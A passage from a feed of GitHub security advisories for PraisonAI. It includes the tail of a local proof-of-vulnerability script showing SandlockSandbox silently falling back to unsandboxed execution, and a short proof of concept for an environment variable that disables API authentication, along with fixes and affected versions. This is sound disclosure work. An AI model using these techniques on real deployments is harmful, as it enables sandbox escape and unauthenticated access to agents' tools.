        result = await sandbox.execute(
            code,
            limits=ResourceLimits(
                timeout_seconds=10,
                memory_mb=512,
                max_processes=10,
                max_open_files=64,
                network_enabled=False,
            ),
            env={"PATH": str(bindir)},
        )

        accepted_payload = None
        with contextlib.suppress(Exception):
            accepted_payload = await accept_task

        server.close()
        await sandbox.stop()

        child_output: dict[str, Any] = {}
        with contextlib.suppress(Exception):
            child_output = json.loads(result.stdout.strip())

        vulnerable = (
            child_output.get("outside_read") == "TENANT_B_CANARY"
            and child_output.get("network_reply") == "local-ok"
        )

        return {
            "repo": str(repo),
            "has_sandlock": True,
            "sandbox_type": sandbox.sandbox_type,
            "sandlock_available": sandbox.is_available,
            "configured_allowed_paths": config.security_policy.allowed_paths,
            "configured_network": config.security_policy.allow_network,
            "outside_path_under_allowed": str(outside).startswith(str(allowed) + os.sep),
            "status": getattr(result.status, "name", str(result.status)),
            "exit_code": result.exit_code,
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "error": result.error,
            "child_output": child_output,
            "accepted_local_payload": accepted_payload,
            "vulnerable": vulnerable,
        }

def main() -&gt; int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--repo", required=True, type=pathlib.Path)
    args = parser.parse_args()

    result = asyncio.run(run_pov(args.repo.resolve()))
    print(json.dumps(result, indent=2, sort_keys=True))

    if result.get("has_sandlock") and not result.get("vulnerable"):
        return 1
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
</code></pre>
<h2 id="poc">PoC</h2>
<p>The PoV section above contains the local reproduction command, input, and decisive output.</p>
<h2 id="impact">Impact</h2>
<p>If a PraisonAI user or service relies on <code>SandlockSandbox</code> / native sandboxing for untrusted code isolation on a host without the required Landlock support, code submitted to the sandbox can execute with the host user's normal filesystem and network access.</p>
<p>Concrete impact includes:</p>
<ul>
<li>reading files outside the configured tenant/workspace path;</li>
<li>reading project files, credentials, <code>.env</code> files, SSH material, or cloud config reachable by the PraisonAI process user;</li>
<li>connecting to loopback or internal services despite <code>network=False</code>;</li>
<li>moving from sandboxed code execution to unsandboxed host-user code execution in deployments that treat Sandlock as the isolation boundary.</li>
</ul>
<p>The local PoV does not read real sensitive files or contact external systems. It uses temporary tenant directories and a localhost TCP listener.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Fail closed when the requested native sandbox boundary cannot be enforced.</p>
<p>Recommended changes:</p>
<ol>
<li>In <code>SandlockSandbox.execute()</code> and <code>run_command()</code>, return a failed <code>SandboxResult</code> or raise a clear runtime error when <code>self.is_available</code> is false.</li>
<li>If fallback behavior is kept for developer convenience, require an explicit opt-in such as <code>allow_degraded=True</code> or <code>fallback="subprocess"</code> and surface that degraded state in the result metadata.</li>
<li>Do not preserve <code>sandbox_type == "sandlock"</code> in status metadata when the actual execution backend is subprocess.</li>
<li>Add regression tests proving that unavailable Landlock does not execute code unless degraded fallback was explicitly requested.</li>
<li>Add tests that a native policy with <code>network=False</code> and a restricted path cannot read outside-path canaries or connect to a localhost listener.</li>
<li>Document the required kernel/ABI versions and the exact degraded-mode semantics.</li>
</ol>
<h2 id="affected-packageversions">Affected Package/Versions</h2>
<ul>
<li>Repository: <code>MervinPraison/PraisonAI</code></li>
<li>Package: <code>praisonai</code></li>
<li>Component: <code>src/praisonai/praisonai/sandbox/sandlock.py</code></li>
<li>Related config component: <code>src/praisonai-agents/praisonaiagents/sandbox/config.py</code></li>
<li>Latest verified release/current head: <code>v4.6.58</code>, <code>1ad58ca02975ff1398efeda694ea2ab78f20cf3e</code></li>
</ul>
<p>Confirmed affected:</p>
<pre><code class="language-text">v4.5.110  vulnerable
v4.5.120  vulnerable
v4.6.58   vulnerable
current   vulnerable
</code></pre>
<p>Negative control:</p>
<pre><code class="language-text">v4.5.109  not affected because SandlockSandbox is absent
</code></pre>
<p>Suggested affected range: <code>&gt;= 4.5.110, &lt;= 4.6.58</code>.</p>
<p>No fixed version is known at submission time.</p>
<h3 id="version-sweep">Version Sweep</h3>
<pre><code class="language-text">version              has_sandlock  sandlock_available  status     outside_read     network_reply  vulnerable
praisonai-v4.5.109   false                                               false
praisonai-v4.5.110   true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
praisonai-v4.6.58    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
praisonai-current    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true
</code></pre>
<p>GitHub history for <code>sandlock.py</code> shows the backend was introduced in <code>4ee7d298c89f</code> on 2026-04-01 with "graceful fallback to SubprocessSandbox", then updated in <code>7ae6c6d19c31</code> on 2026-04-02 to use the current Landlock ABI check.</p>
<h2 id="advisory-history">Advisory History</h2>
<p>Nearby advisories are distinct:</p>
<ul>
<li><code>GHSA-r4f2-3m54-pp7q</code> / <code>CVE-2026-34955</code>: <code>SubprocessSandbox</code> shell command escape through <code>4.5.96</code>.</li>
<li><code>GHSA-4mr5-g6f9-cfrh</code>, <code>GHSA-qf73-2hrx-xprp</code>, <code>GHSA-6vh2-h83c-9294</code>: <code>execute_code()</code> Python sandbox escapes.</li>
<li><code>GHSA-ch89-h4r2-c8f8</code>: agent tools workspace escape via symlinks.</li>
<li><code>GHSA-gcq3-mfvh-3x25</code>: PraisonAI Code agent tool workspace fail-open.</li>
</ul>
<p>This report covers a different root cause: <code>SandlockSandbox</code> / native sandbox policy downgrade when Landlock is unavailable. It reproduces on the latest release <code>v4.6.58</code>, while the older <code>SubprocessSandbox</code> shell escape advisory was fixed at <code>4.5.97</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6jcq-6546-qrrw">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6jcq-6546-qrrw</a></li>
<li><a href="https://github.com/advisories/GHSA-6jcq-6546-qrrw">https://github.com/advisories/GHSA-6jcq-6546-qrrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jcq-6546-qrrw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-18T14:27:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI: PRAISONAI_CALL_AUTH=disabled environment variable unconditionally disables authentication]]></title>
        <id>https://github.com/advisories/GHSA-8ccj-p46r-jwqq</id>
        <link href="https://github.com/advisories/GHSA-8ccj-p46r-jwqq"/>
        <updated>2026-06-18T14:27:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Setting <code>PRAISONAI_CALL_AUTH=disabled</code> completely disables all authentication on the <code>/api/v1/agents/{id}/invoke</code> endpoint. This bypass is advertised in the application's own error messages, making it likely to appear in production Docker and Compose configurations.</p>
<h3 id="details">Details</h3>
<pre><code class="language-python"># src/praisonai/praisonai/api/agent_invoke.py:32
_CALL_AUTH_DISABLED = os.getenv('PRAISONAI_CALL_AUTH', '').lower() == 'disabled'

async def verify_token(...) -&gt; None:
    if _CALL_AUTH_DISABLED:
        return  # all authentication skipped unconditionally
</code></pre>
<p>The application's own error message advertises the bypass:</p>
<blockquote>
<p>"Set CALL_SERVER_TOKEN or PRAISONAI_CALL_AUTH=disabled to run without authentication."</p>
</blockquote>
<p>This causes the setting to appear in Docker/Compose configurations as a convenience option.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-python">import os
os.environ["PRAISONAI_CALL_AUTH"] = "disabled"
# verify_token() now returns immediately for any request
# POST /api/v1/agents/any-agent/invoke → 200 OK (no token needed)
</code></pre>
<p>Common vulnerable deployment:</p>
<pre><code class="language-yaml"># docker-compose.yml
environment:
  - PRAISONAI_CALL_AUTH=disabled  # auth completely disabled
</code></pre>
<h3 id="impact">Impact</h3>
<p>Full unauthenticated access to the agent invocation API. Any agent registered on the server can be triggered without credentials, potentially executing arbitrary actions depending on the agent's configured tools.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8ccj-p46r-jwqq">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8ccj-p46r-jwqq</a></li>
<li><a href="https://github.com/advisories/GHSA-8ccj-p46r-jwqq">https://github.com/advisories/GHSA-8ccj-p46r-jwqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8ccj-p46r-jwqq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-18T14:27:15.000Z</published>
    </entry>
</feed>